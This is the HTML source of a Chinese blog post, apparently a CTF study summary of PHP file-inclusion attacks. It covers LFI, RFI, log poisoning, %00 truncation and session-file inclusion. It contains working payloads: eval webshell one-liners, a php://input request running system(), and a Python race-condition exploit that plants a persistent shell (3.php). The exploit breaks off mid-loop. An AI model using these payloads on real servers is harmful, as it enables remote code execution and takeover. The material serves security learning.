@@ -1,0 +1,696 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>文件包含总结 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">直接读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">php伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">Apache日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.6.</span> <span class="toc-text">nginx日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88LFI%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">本地文件包含漏洞（LFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.7.1.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD%E6%94%BB%E5%87%BB"><span class="toc-number">1.7.2.</span> <span class="toc-text">%00截断攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88RFI%EF%BC%89"><span class="toc-number">1.8.</span> <span class="toc-text">远程文件包含漏洞（RFI）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.9.</span> <span class="toc-text">Session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.9.1.</span> <span class="toc-text">session工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.9.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-upload-progress"><span class="toc-number">1.9.3.</span> <span class="toc-text">session.upload_progress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.9.4.</span> <span class="toc-text">session条件竞争</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">1.10.</span> <span class="toc-text">绕过死亡代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.11.</span> <span class="toc-text">防御</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>文件包含总结</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/15
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #ffa2c4">文件包含</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/PHP/" style="color: #ffa2c4">PHP</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">3.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">13分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/111713495">文件包含</a></h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li>看服务器类型</li>
+<li>测试是否能够直接读取</li>
+<li>根据过滤找出可用的伪协议</li>
+<li>观察代码，寻找可利用的函数</li>
+<li>伪协议不可用尝试使用日志包含</li>
+<li>过滤后缀尝试使用session文件包含</li>
+</ol>
+<span id="more"></span>
+
+<hr>
+<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p><code>include()</code>:包含一个文件，如错误则抛出警告</p>
+<p><code>include_once()</code>:包含一个文件仅一次，和上面类似</p>
+<p><code>require()</code>:包含一个文件，如错误则报错并停止脚本</p>
+<p><code>require_once()</code>:包含一个文件仅一次，和上面类似</p>
+<p>注：<strong>任何类型</strong>的文件，只要其中含有合法PHP代码，PHP就可以包含并执行；如果没有，就会以纯文本形式显示文件中的内容</p>
+<hr>
+<h2 id="直接读取"><a href="#直接读取" class="headerlink" title="直接读取"></a>直接读取</h2><p>测试直接读取有无回显</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span>etc/passwd
+是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作
+
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www/html+文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者利用<code>../</code>相对路径进行目录穿越读取特定文件</p>
+<hr>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a><a href="https://c1oudfl0w0.github.io/blog/2023/03/15/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php伪协议</a></h2><p>有时候包含的文件直接读取会产生报错，就需要采用伪协议进行内容读取</p>
+<hr>
+<h2 id="Apache日志文件"><a href="#Apache日志文件" class="headerlink" title="Apache日志文件"></a>Apache日志文件</h2><ul>
+<li><p><strong>access.log</strong></p>
+<p>记录网站的访问信息，包括user-agent头的信息，</p>
+<p><code>客户端IP - - [访问时间] &quot;请求记录&quot; HTTP状态码 字节数</code></p>
+</li>
+<li><p><strong>error.log</strong></p>
+<p>记录错误的访问信息</p>
+</li>
+</ul>
+<blockquote>
+<p>注：每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。 再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。</p>
+</blockquote>
+<hr>
+<h2 id="nginx日志文件"><a href="#nginx日志文件" class="headerlink" title="nginx日志文件"></a>nginx日志文件</h2><p>位置：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>格式为</p>
+<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">log_format</span> access <span class="token string">'<span class="token variable">$remote_addr</span> – <span class="token variable">$remote_user</span> [<span class="token variable">$time_local]</span> "<span class="token variable">$request</span>"'</span> <span class="token string">'<span class="token variable">$status</span> <span class="token variable">$body_bytes_sent</span> "<span class="token variable">$http_referer</span>"'</span> <span class="token string">'"<span class="token variable">$http_user_agent</span>" <span class="token variable">$http_x_forwarded_for</span>'</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<hr>
+<h2 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><p>原理：对网站进行访问时，日志文件会记录相关信息(请求头中的信息)，而且一旦写入php一句话木马就可以被包含执行</p>
+<p>前提：知道日志文件所在，并能进行包含</p>
+<blockquote>
+<p>ctfshow web150</p>
+</blockquote>
+<p><img src="/blog/2023/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20230718120031429.png" alt="image-20230718120031429"></p>
+<ul>
+<li><p>使用BurpSuite发送请求，在UA头写入一句话木马</p>
+<p>然后就可以include到当前php文件中，实现命令执行，把PHP一句话写进access.log里</p>
+</li>
+<li><p><code>../</code>返回上级目录，可以读取上级目录的access.log文件</p>
+</li>
+</ul>
+<blockquote>
+<p>注：如果不知道日志文件的地址，可以把参数设置成一个不存在的文件名，比如<code>?jumpTo=114514</code>，这样网页会报错显示网站的绝对路径  （如果没有屏蔽报错），使用了各种面板的会显示面板的错误信息，可以以此来判断日志路径。</p>
+</blockquote>
+<hr>
+<h3 id="00截断攻击"><a href="#00截断攻击" class="headerlink" title="%00截断攻击"></a>%00截断攻击</h3><blockquote>
+<p>PHP &lt; 5.3.4</p>
+</blockquote>
+<p>场景：对传入的参数使用字符串拼接</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"txt"</span><span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li>在ASCII字符集中，<code>%00</code>代表的是<strong>字符串的结束</strong>，也就是说，如果在一串字符的中间插入<code>%00</code>，那么后面的字符串会被丢弃。如果把参数值改为<code>shell.jpg%00</code>，那么之后拼接的字符串将被<code>include</code>方法所丢弃。这样就能成功访问一句话木马。</li>
+</ul>
+<hr>
+<h2 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h2><p>本质是使用<strong>PHP伪协议</strong>进行包含</p>
+<p>题目的代码类似于</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+       <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由此可以远程包含自己服务器上的一句话木马并执行</p>
+<ul>
+<li><p>无限制：参数之后加上危险脚本的URL，一般把如一句话木马的php脚本放在自己的vps上进行远程包含</p>
+</li>
+<li><p>有限制时截断：</p>
+<ul>
+<li>使用<code>?</code>绕过，<strong>问号之后的字符串会被当做查询参数丢弃</strong></li>
+<li>使用<code>%20</code>绕过</li>
+</ul>
+</li>
+<li><p>伪协议php:&#x2F;&#x2F;input控制输出流：（BurpSuite）</p>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">GET &#x2F;file_include&#x2F;index.php?jumpTo&#x3D;php:&#x2F;&#x2F;input HTTP&#x2F;1.1
+Host: 127.0.0.1
+......
+Sec-Fetch-User: ?1
+
+&lt;?php system(&quot;ipconfig&#x2F;all&quot;); ?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时把显示主机IP地址信息的命令“输入”到了PHP中</p>
+</li>
+</ul>
+<hr>
+<h2 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h2><blockquote>
+<p>php中唯一能无后缀控制，通过向session传入恶意代码并访问其文件实现</p>
+</blockquote>
+<h3 id="session工作流程"><a href="#session工作流程" class="headerlink" title="session工作流程"></a>session工作流程</h3><blockquote>
+<p><code>Session</code>一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制</p>
+</blockquote>
+<ol>
+<li>首先使用<code>session_start()</code>函数进行初始化</li>
+<li>当执行PHP脚本时，通过使用<strong>SESSION超全局变量</strong>注册session变量即<code>$_SESSION</code></li>
+<li>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的<code>session.savepath</code>指定，下次浏览网页时可以加载使用</li>
+</ol>
+<ul>
+<li><p><strong>session_start()</strong></p>
+<p>（1）读取名为<strong>PHPSESSID</strong>（如果没有改变默认值）的cookie值，假使为abc123。</p>
+<p>（2）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以在php.ini中设置）读取<code>SESSabc123</code>（默认是这种命名方式）文件，将字符装入SESSION变量中；</p>
+<p>（3）若没有读取到PHPSESSID这个COOKIE，也会创建SESSION超全局变量注册session变量。同时创建一个 sess_abc123 (名称为随机值)的session文件，同时将abc123作为PHPSESSID的cookie值返回给浏览器端。</p>
+</li>
+</ul>
+<p><img src="/blog/2023/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20240422194656765.png" alt="image-20240422194656765"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>$_SESSION[&quot;username&quot;]=参数</code></p>
+<p>当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击</p>
+<p>Session的存储位置获取：</p>
+<ol>
+<li>通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的<strong>session.save_path</strong>存储的是Session的存放位置</li>
+<li>通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在<code>/var/lib/php/session</code>目录下</li>
+</ol>
+<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120300273?ops_request_misc=&request_id=&biz_id=102&utm_term=session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120300273.nonecase&spm=1018.2226.3001.4187">session.upload_progress</a></h3><p>条件：<code>Session Support: enable</code></p>
+<blockquote>
+<p>当我们将<code>session.upload_progress.enabled</code>的值设置为<strong>on</strong>时，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传进度等)存储在session当中。</p>
+</blockquote>
+<ul>
+<li><p><strong>session.auto_start</strong>：如果 <code>session.auto_start=On </code>，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
+<p>但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为 off。此时用户是可以自己定义 Session ID 的。</p>
+<p>比如，我们在 Cookie 里设置 PHPSESSID&#x3D;a ，PHP 将会在服务器上创建一个文件：<code>/tmp/sess_a</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由<code>ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name</code>值组成，最后被写入 sess_ 文件里。</p>
+</li>
+<li><p><strong>session.save_path</strong>：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件</p>
+</li>
+<li><p><strong>session.upload_progress_enabled</strong>：当这个配置为 On 时，代表 <strong>session.upload_progress 功能开启</strong>，如果这个选项关闭，则这个方法用不了</p>
+</li>
+<li><p><strong>session.upload_progress_cleanup</strong>：这个选项默认也是 On，也就是说<strong>当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉</strong>；这里就给我们的操作造成了很大的困难，我们就只能使用<strong>条件竞争</strong>的方式不停的发包，争取在它被删除掉之前就成功利用</p>
+</li>
+<li><p><strong>session.upload_progress_name</strong>：session中的键值，当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控</p>
+</li>
+<li><p><strong>session.upload_progress_prefix</strong>：可以设置上传文件内容的前缀，与session.upload_progress_name 将表示为 session 中的键名</p>
+</li>
+</ul>
+<h3 id="session条件竞争"><a href="#session条件竞争" class="headerlink" title="session条件竞争"></a>session条件竞争</h3><blockquote>
+<p>by <a target="_blank" rel="noopener" href="https://ph0ebus.github.io/post/[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021]EasyCleanup.html">ph0ebus</a></p>
+</blockquote>
+<ul>
+<li><p>目标环境开启了<code>session.upload_progress.enable</code>选项</p>
+</li>
+<li><p>发送一个文件上传请求，其中包含一个文件表单和一个名字是PHP_SESSION_UPLOAD_PROGRESS的字段</p>
+</li>
+<li><p>请求的Cookie中包含Session ID</p>
+</li>
+<li><p>注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。</p>
+</li>
+</ul>
+<p>exp:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> io
+<span class="token keyword">import</span> threading
+
+url <span class="token operator">=</span> <span class="token string">'http://6f7113f0-473f-406d-90a6-0cdbbdfacb48.challenge.ctf.show/'</span>    <span class="token comment"># 改成自己的url</span>
+sessionid <span class="token operator">=</span> <span class="token string">'truthahn'</span>      <span class="token comment"># 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn</span>
+cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
+        <span class="token punctuation">&#125;</span>
+
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>		<span class="token comment"># write()函数用于写入session临时文件</span>
+    fileBytes <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment"># 设置上传文件的大小为50k</span>
+    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?=eval($_POST[1])?>'</span>    <span class="token comment"># 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?> 实现一句话</span>
+    <span class="token punctuation">&#125;</span>
+    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'truthahn.jpg'</span><span class="token punctuation">,</span>fileBytes<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    
+        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+        <span class="token comment"># print(res.text)</span>
+        <span class="token comment">#print('======= write done! ======')</span>
+
+<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span> 		<span class="token comment"># read()函数利用session临时文件生成一句话木马，实现rce</span>
+    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"1"</span><span class="token punctuation">:</span><span class="token string">"file_put_contents('/var/www/html/3.php','&lt;?=eval($_POST[2]);?>');"</span>     <span class="token comment"># 使用file_put_contents()php内置函数生成名为3.php的shell文件</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_'</span><span class="token operator">+</span>sessionid<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+        <span class="token comment"># print(res.text)</span>
+        res2 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'3.php'</span><span class="token punctuation">)</span>
+        <span class="token comment"># print(res2.text)</span>
